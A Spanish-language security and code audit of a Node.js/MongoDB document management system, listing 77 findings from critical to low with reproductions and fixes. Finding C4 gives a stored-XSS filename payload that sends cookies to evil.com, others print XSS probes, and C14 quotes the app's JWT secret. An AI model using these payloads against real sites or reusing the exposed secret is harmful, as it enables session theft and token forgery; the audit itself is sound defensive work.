# Revisión Exhaustiva de Código — Sistema Gestión Documental
**Fecha:** 2026-07-28
**Archivos auditados:** server.js, db.js, public/app.js, public/funcionario.js, public/utils.js, public/*.html, public/style.css, .env

---

## 🔴 CRÍTICO (18 hallazgos)

### C1. TLS bypass global deshabilita verificación de certificados
**Archivos:** `server.js:4`, `db.js:84`
**Tipo:** VULNERABILIDAD — MITM en todo el tráfico HTTPS
`NODE_TLS_REJECT_UNAUTHORIZED = '0'` deshabilita verificación TLS para **todo** el proceso Node.js (MongoDB Atlas, Google APIs, cualquier fetch/axios). + en db.js: `tlsAllowInvalidCertificates=true`. Un atacante en la misma red puede interceptar contraseñas, tokens, documentos, credenciales OAuth.
> ⚠️ Ya se documentó que es necesario para MongoDB Atlas en Node v22 + Windows. Riesgo aceptado pero documentado.

### C2. Endpoint de descarga de documentos sin autenticación
**Archivo:** `server.js:1339`
**Tipo:** VULNERABILIDAD — Exposición total de documentos
`GET /api/document-file/:filename` no tiene `authMiddleware`. Cualquier persona sin token puede descargar cualquier archivo de `DOCUMENTS_DIR`, `SCANNER_DIR`, `GMAIL_INBOX_DIR` mediante `?folder=scanner` o `?folder=gmail`.

### C3. Exposición de hashes de contraseña en endpoints masivos
**Archivo:** `server.js:889-891`, `server.js:1052`
**Tipo:** VULNERABILIDAD — Exposición de credenciales
`GET /api/employees` y dashboard retornan `password` (bcrypt hash), `passwordHistory` (historial de hashes), `failedAttempts`, `lockedUntil` sin proyección que los excluya.
**Reproducción:** `GET /api/employees` con token admin → en JSON vienen `"password": "$2a$12$..."`.

### C4. XSS masivo por patrón `sanitize().replace()` roto en onclick
**Archivos:** `public/app.js:534,540,545,590,667,674,815,827,833,1602-1603,1787-1791`, `public/funcionario.js:225-226,237-238,269-270,277-278,313-314,316-317,378,419,462,588`
**Tipo:** VULNERABILIDAD — Cross-Site Scripting (almacenado)
`sanitize(text)` convierte `'` → `&#39;` (entidad HTML). Luego `.replace(/'/g, "\\'")` busca `'` literal que ya no existe. El HTML resultante `onclick="fn('&#39;;alert(1)//')"` es parseado por el navegador: `&#39;` → `'` literal, produciendo `fn('';alert(1)//')` → **XSS ejecutable**.
**Reproducción:** Crear documento con filename `';fetch('https://evil.com/?c='+document.cookie)//.pdf`. Cualquier admin/funcionario que abra la lista ejecuta el payload.
**Corrección:** Usar `encodeURIComponent()` para valores en onclick, o mejor: migrar a data-* attributes + addEventListener.

### C5. XSS en `showToast()` sin sanitizar
**Archivo:** `public/utils.js:74`
**Tipo:** VULNERABILIDAD — XSS reflejado
`showToast(message)` asigna `message` directamente a `innerHTML` sin pasar por `sanitize()`. Cualquier flujo que controle el mensaje ejecuta JS arbitrario.
**Reproducción:** `showToast('<img src=x onerror=alert(document.cookie)>')`

### C6. XSS en fallback de visor PDF
**Archivo:** `public/utils.js:239,269`
**Tipo:** VULNERABILIDAD — XSS almacenado
`renderPdfFallback()` interpola `${filename}` y `${url}` en innerHTML sin sanitizar. Un documento con nombre `<img src=x onerror=alert(1)>.pdf` ejecuta JS al abrir el visor.

### C7. Drag & drop de archivos no funciona (propiedad read-only)
**Archivo:** `public/utils.js:303`
**Tipo:** BUG — Funcionalidad rota
`fileInput.files = e.dataTransfer.files` asigna a propiedad de solo lectura `HTMLInputElement.files`. En Firefox/Safari/Chrome falla silenciosamente. Arrastrar archivos al drop zone parece funcionar pero nunca se adjunta al input.

### C8. Token JWT en localStorage (vulnerable a XSS)
**Archivo:** `public/index.html:114,152-153`
**Tipo:** VULNERABILIDAD — Almacenamiento inseguro
JWT se guarda en `localStorage`, accesible desde cualquier JS en el mismo origen. Cualquier XSS (C4-C6) permite robar tokens.

### C9. HTML mal formado — dos `</div>` sin apertura rompen layout de correo
**Archivo:** `public/admin.html:455-456`
**Tipo:** BUG — DOM roto
Dos `</div>` consecutivos cierran `div.sections-container` y `div.app-container` prematuramente. La sección de correo (subtab 3, líneas 459-519) queda fuera del contenedor principal, invisible o mal posicionada.

### C10. `border-opacity` no es propiedad CSS válida
**Archivo:** `public/style.css:934,941,948`
**Tipo:** BUG — CSS ignorado
`.badge-status` usa `border-opacity: 0.15`. No existe en CSS. Los bordes se renderizan con opacidad 100%.

### C11. Variable CSS `--bg-secondary` no definida
**Archivo:** `public/style.css` (ausente), usada en `app.js:1595,1859`, `funcionario.js:270,555,566`
**Tipo:** BUG — CSS broken
Se referencia `var(--bg-secondary)` en listas de escáner/correo pero nunca se declara en `:root`. Fallback es `transparent`. En tema oscuro, texto y bordes pueden ser ilegibles.

### C12. Credenciales de MongoDB Atlas en texto plano
**Archivo:** `.env:1`
**Tipo:** VULNERABILIDAD — Exposición de secretos
`mongodb+srv://jgcorzo_db_user:REDACTADO@...` contiene usuario y contraseña reales. Sin `.gitignore`, se subirán al repo.

### C13. No existe `.gitignore`
**Archivo:** (raíz del proyecto)
**Tipo:** VULNERABILIDAD — Exposición de secretos
Sin `.gitignore`, `.env` y `node_modules/` no están excluidos. `git add .` subiría credenciales.

### C14. `JWT_SECRET` hardcodeado y predecible
**Archivo:** `.env:3`
**Tipo:** VULNERABILIDAD — Falsificación de tokens
`th_valledupar_jwt_secret_2026` contiene nombre del municipio y año. Un atacante puede generar JWTs válidos para cualquier rol.

### C15. Contraseña admin por defecto `'admin'`
**Archivo:** `db.js:124,178`
**Tipo:** VULNERABILIDAD — Acceso no autorizado
`bcrypt.hash('admin', 10)` hardcodeada. La contraseña del administrador por defecto es conocida.

### C16. Seed data con race condition — duplicados en múltiples instancias
**Archivo:** `db.js:119-173`
**Tipo:** BUG — Integridad de datos
Se verifica `usersCount === 0` y luego se inserta, pero no es atómico. Dos servidores iniciando simultáneamente insertan duplicados.

### C17. Migraciones asíncronas fire-and-forget sin `await`
**Archivo:** `db.js:185-211`
**Tipo:** BUG — Datos inconsistentes
`Promise.all([...]).then(...).catch(() => {})` se lanza sin `await`. Si el servidor se cierra durante migraciones, algunos documentos quedan sin migrar.

### C18. Migraciones tragan errores en silencio
**Archivo:** `db.js:211`
**Tipo:** BUG — Sin observabilidad
`.catch(() => {})` traga errores completamente. Si `updateMany` falla, no hay log ni indicación.

---

## 🟠 ALTO (21 hallazgos)

### A1. `uncaughtException` sin `process.exit()`
**Archivo:** `server.js:24`
**Tipo:** BUG — Estado de proceso indeterminado
Node.js documenta que después de `uncaughtException` el proceso debe terminar. Aquí solo se logea, dejando el servidor en estado potencialmente corrupto.

### A2. Eliminación/suspensión de empleado no invalida JWT
**Archivo:** `server.js:939-953`
**Tipo:** VULNERABILIDAD — Authorization bypass
Se cambia `status`/`active` pero no se incrementa `jwtVersion`. El token emitido antes de la suspensión sigue siendo válido hasta su expiración (12h).

### A3. TOCTOU race condition en `registerDocumentCore` (modo mover)
**Archivo:** `server.js:466-505`
**Tipo:** RACE CONDITION — Pérdida de datos
1) Verifica `existsSync` → 2) `copyFileSync` + `unlinkSync`. Entre 1 y 2, otro request concurrente puede haber movido/eliminado el archivo.

### A4. Race condition en conteo de intentos de login
**Archivo:** `server.js:188-205`
**Tipo:** RACE CONDITION — Bypass de rate-limit
`insertOne` y luego `countDocuments` como operaciones separadas. Requests concurrentes pueden evadir el límite de 5 intentos.

### A5. Race condition en historial de contraseñas
**Archivo:** `server.js:334-341`
**Tipo:** RACE CONDITION — Historial inconsistente
Lee `passwordHistory`, modifica en memoria, escribe de vuelta. Dos cambios concurrentes: el último `$set` sobrescribe al primero.

### A6. Archivo eliminado físicamente antes de confirmar eliminación lógica
**Archivo:** `server.js:1305-1309`
**Tipo:** BUG — Pérdida de datos
Primero `fs.unlinkSync` (archivo físico), luego `deleteOne` (BD). Si el paso 2 falla, el archivo se perdió pero el registro persiste.

### A7. `error.message` retornado al cliente
**Archivo:** `server.js:1762`
**Tipo:** VULNERABILIDAD — Information disclosure
Errores internos (rutas del servidor, estructura BD, stack traces) se retornan al cliente.

### A8. XSS en escáneres — `s.type`, `s.status`, `s.ip` sin sanitizar
**Archivo:** `public/funcionario.js:571,573,575`
**Tipo:** VULNERABILIDAD — XSS reflejado
`s.type`, `s.status`, `s.ip` se interpolan directamente en template literals sin `sanitize()`. Solo `s.name` está sanitizado.

### A9. `loadPortalData()` traga errores sin feedback al usuario
**Archivo:** `public/funcionario.js:182-184`
**Tipo:** BUG — UX roto
Errores de red/500/token expirado solo hacen `console.error()`. No hay `hideLoader()`, toast, ni alerta. El usuario ve página vacía sin saber por qué.

### A10. Múltiples catch vacíos que tragan errores silenciosamente
**Archivos:** `server.js:770-773,1073-1079,1084`, `public/app.js:79,1886`, `public/funcionario.js:137,582`
**Tipo:** BUG — Sin observabilidad
Errores críticos (DB, permisos, conectividad) se pierden. Frontend muestra datos parciales como si fueran completos.

### A11. Sin null checks en `getElementById` — crash total si falta un elemento HTML
**Archivo:** `public/funcionario.js:44,47,53,54,59,91,94,97`
**Tipo:** BUG — App rota
Ocho llamadas sin verificar existencia. Si CUALQUIER elemento falta, TypeError detiene toda la inicialización.

### A12. Formularios sin protección contra doble envío
**Archivos:** `public/app.js:1173-1219,1222-1279,1282-1324`, `public/funcionario.js:104-127,332-373,388-414,430-457`
**Tipo:** BUG — Operaciones duplicadas
Ningún handler usa flag de "submitting". Usuario puede hacer clic múltiples veces. El backend no tiene idempotencia.

### A13. `setInterval` sin limpiar — memory leak y requests huérfanos
**Archivos:** `public/funcionario.js:41`, `server.js:1798`
**Tipo:** BUG — Memory leak
`setInterval(refreshPortalScannerStatus, 15000)` nunca se limpia. Si la llamada tarda >15s, se amontonan requests. Ídem health check interval.

### A14. Sin timeout en peticiones fetch — UI congelada indefinidamente
**Archivos:** `public/funcionario.js` (todas las llamadas), `public/app.js` (todas las llamadas)
**Tipo:** BUG — UX congelada
Ningún `fetch` tiene timeout. Si el servidor se cuelga, el loader nunca se oculta.

### A15. `doc.status.toLowerCase()` crashea si status es null/undefined
**Archivo:** `public/funcionario.js:235`
**Tipo:** BUG — Lista de documentos no se renderiza
Si UN documento no tiene `status`, la lista COMPLETA deja de renderizarse.

### A16. Gmail sync ignora paginación (solo procesa primeros 25)
**Archivo:** `server.js:1659-1660`
**Tipo:** BUG — Pérdida de adjuntos
`maxResults: 25` pero `nextPageToken` se ignora. Si hay >25 correos con PDF, los adicionales nunca se sincronizan.

### A17. Sin validación de ObjectId en queries — resultados incorrectos
**Archivo:** `server.js` (múltiples rutas)
**Tipo:** BUG — Queries sin match
Cuando se pasa un string no-ObjectId a `findOne({ _id: id })`, MongoDB no hace matching. El usuario recibe "no encontrado" silenciosamente.

### A18. Sin índices — queries O(n) en colecciones que crecen
**Archivo:** `db.js` (ausencia de `createIndex`)
**Tipo:** PERFORMANCE — Degradación lineal
No hay índices en `users.email`, `loginAttempts.email`, `documents.employeeId`, `auditLogs.timestamp`. Login se vuelve lento con miles de usuarios.

### A19. Sin TTL indexes — colecciones crecen sin límite
**Archivo:** `db.js` (ausencia)
**Tipo:** STORAGE — Crecimiento ilimitado
`loginAttempts`, `passwordResetTokens`, `activationTokens`, `securityLogs` no tienen TTL index.

### A20. Endpoints sin paginación que cargan colecciones completas en memoria
**Archivo:** `server.js:1050-1067,1116,1361,1651`
**Tipo:** PERFORMANCE — Potencial OOM
`find().toArray()` sin límite en documents, employees, auditLogs, deletionRequests, emailInbox. Con miles de documentos, consume toda la RAM.

### A21. Dashboard carga TODAS las colecciones simultáneamente
**Archivo:** `server.js:1047-1113`
**Tipo:** PERFORMANCE — Pico de memoria
Carga en paralelo 7 colecciones completas + 2 agregaciones. Para cientos de empleados y miles de documentos, consume cientos de MB.

---

## 🟡 MEDIO (20 hallazgos)

### M1. Graceful shutdown no cierra MongoDB ni espera conexiones activas
**Archivo:** `server.js:1804`
`server.close()` sin callback + `process.exit(0)` inmediato + sin `client.close()`. Writes en curso se abortan.

### M2. Activación de cuenta no resetea `lockedUntil` / `failedAttempts`
**Archivo:** `server.js:665-675`
Usuario activado puede quedar bloqueado si `lockedUntil` tenía valor futuro residual.

### M3. `refreshScannerCache` retorna datos obsoletos
**Archivo:** `server.js:1578-1603`
Usa `setImmediate`, la detección ocurre **después** de enviar la respuesta. El usuario ve caché anterior.

### M4. Fechas inválidas muestran "Invalid Date" al usuario
**Archivo:** `public/funcionario.js:224,274,323`
`new Date(null/undefined/malformed)` produce "Invalid Date" visible.

### M5. `appState.documents`/`employees`/etc usados sin verificar existencia
**Archivo:** `public/app.js:1073,1127,502-503,638,756,449,378,691-695`
Si `loadAllData()` falla, son `undefined` y lanzan TypeError.

### M6. Sin validación de campos en formularios antes de enviar
**Archivo:** `public/funcionario.js:332-373,388-414,430-457,472-507`
Se envían campos vacíos o inválidos al servidor sin validación frontend.

### M7. Enlace de activación sin `encodeURIComponent()`
**Archivo:** `public/app.js:1197`
Token con caracteres `+`, `/`, `=` rompe la URL.

### M8. `email.body` sin null-check crashea render
**Archivo:** `public/app.js:1725,1756`
Si `email.body` es null, TypeError no renderiza ningún correo.

### M9. `data.config` usado sin verificar existencia
**Archivo:** `public/app.js:237-246`
Si API cambia estructura, `appState.documentTypes = data.config.documentTypes` crashea.

### M10. `renderEmailInbox()` sobrescribe container, dejando banner Gmail huérfano
**Archivo:** `public/app.js:1709`
`container.innerHTML = ''` elimina el banner insertado por `renderGmailStatusBanner`.

### M11. Modal PDF sin cleanup correcto en `closeModal()`
**Archivo:** `public/utils.js:151-153`
Si iframe fue removido del DOM antes de cerrar, `iframe.parentElement` es null.

### M12. `getInitials()` produce string `"undefined"` con espacios múltiples
**Archivo:** `public/utils.js:158-160`
`'Ana  Maria'.split(' ')` → `['Ana', '', 'Maria']`, `''[0]` es `undefined`.

### M13. `setupThemeToggle()` y `setupDragDrop()` agregan listeners duplicados en cada llamada
**Archivo:** `public/utils.js:208-216,285-307`
Sin guard contra múltiples llamadas. Listeners se acumulan.

### M14. `populateDropdown()` itera `items` sin validar null/undefined
**Archivo:** `public/utils.js:177`
TypeError si `items` es null.

### M15. Sin schema validation en MongoDB
**Archivo:** `db.js` (ausencia)
Cualquier código puede insertar documentos con estructura arbitraria.

### M16. Seed data sin transacciones — estado parcial si falla
**Archivo:** `db.js:138-169`
Inserciones secuenciales sin transacción. Si una falla, colecciones anteriores ya se insertaron.

### M17. Reconnect con setTimeout de 10s drena pool antiguo abruptamente
**Archivo:** `db.js:258-259`
Queries en curso en cliente antiguo fallan cuando se cierra.

### M18. Sin exponential backoff en reconexión MongoDB
**Archivo:** `db.js:106`
Delay constante 500-1500ms en todos los reintentos. Si Atlas tarda más en recuperarse, los 4 intentos fallan rápido.

### M19. Event listeners de MongoClient no se limpian
**Archivo:** `db.js:94-96`
Cada iteración del loop crea nuevo `MongoClient` y registra listeners. Fuga de memoria en reconexiones.

### M20. Sin CSRF protection
**Archivo:** Todos los formularios HTML
Ningún formulario incluye token CSRF. Vulnerable a Cross-Site Request Forgery.

---

## 🟢 BAJO (18 hallazgos)

### B1. Endpoints `/api/gmail/status` y `/api/gmail/authorize` sin autenticación
**Archivo:** `server.js:1621-1636`
Revelan si Gmail está configurado/autenticado.

### B2. Validación de upload por extensión únicamente (no magic bytes)
**Archivo:** `server.js:151-156`
`.pdf` con contenido ejecutable se guarda igual.

### B3. Faltan manejadores `SIGBREAK`/`SIGHUP` en Windows
**Archivo:** `server.js:1807-1808`
Cerrar ventana de consola no ejecuta shutdown graceful.

### B4. `hpp()` sin whitelist — podría romper parámetros repetidos
**Archivo:** `server.js:64`

### B5. Eliminación física usa `doc.filename` directamente sin re-validar
**Archivo:** `server.js:1219-1222`
Si un admin malicioso modifica `filename` en BD, path traversal al eliminar.

### B6. `selectId.includes('employee')` match demasiado amplio
**Archivo:** `public/utils.js:180`
Selects no-empleado que contengan "employee" en su ID se formatean incorrectamente.

### B7. `apiFetch()` no captura errores de red
**Archivo:** `public/utils.js:34-48`
Llamadas directas sin `.catch()` producen unhandled promise rejection.

### B8. Sin límite de toasts simultáneos
**Archivo:** `public/utils.js:74-95`
Bucle de notificaciones acumula elementos DOM infinitos.

### B9. `navigator.clipboard.writeText()` falla en HTTP
**Archivo:** `public/app.js:1200`
Muestra "Enlace copiado" aunque la copia haya fallado.

### B10. Token de activación/reset en URL query string
**Archivo:** `public/forgot-password.html`, `public/activate.html`
Token visible en historial, logs del servidor y cabecera Referer.

### B11. Email del usuario mostrado en UI de restablecimiento
**Archivo:** `public/forgot-password.html:121`
Permite enumerar qué correos están registrados.

### B12. Sin `role="dialog"` ni `aria-modal` en modales
**Archivo:** `public/admin.html`, `public/funcionario.html`
Lectores de pantalla no identifican los diálogos.

### B13. Sin `aria-hidden="true"` en iconos SVG decorativos
**Archivo:** Todos los HTML
Lectores de pantalla anuncian paths SVG sin sentido.

### B14. Contraste insuficiente en `.text-muted` en modo oscuro (~3.8:1, requiere 4.5:1)
**Archivo:** `public/style.css:75`
Usuarios con baja visión no leen subtítulos en modo oscuro.

### B15. `-webkit-backdrop-filter` inconsistente en modal-backdrop
**Archivo:** `public/style.css:1375`
Safari <16 no muestra blur en backdrop modal.

### B16. `strength-bar` sin `width` inicial — transición no se anima
**Archivo:** `public/style.css:2104-2107`

### B17. `console.error` expone errores de API en consola del navegador
**Archivo:** `public/app.js`, `public/funcionario.js`

### B18. Comentario en HTML expone lógica de `edit-mode-local`
**Archivo:** `public/admin.html:765`

---

## Resumen

| Severidad | Cantidad |
|-----------|----------|
| 🔴 CRÍTICO | 18 |
| 🟠 ALTO    | 21 |
| 🟡 MEDIO   | 20 |
| 🟢 BAJO    | 18 |
| **TOTAL**  | **77** |
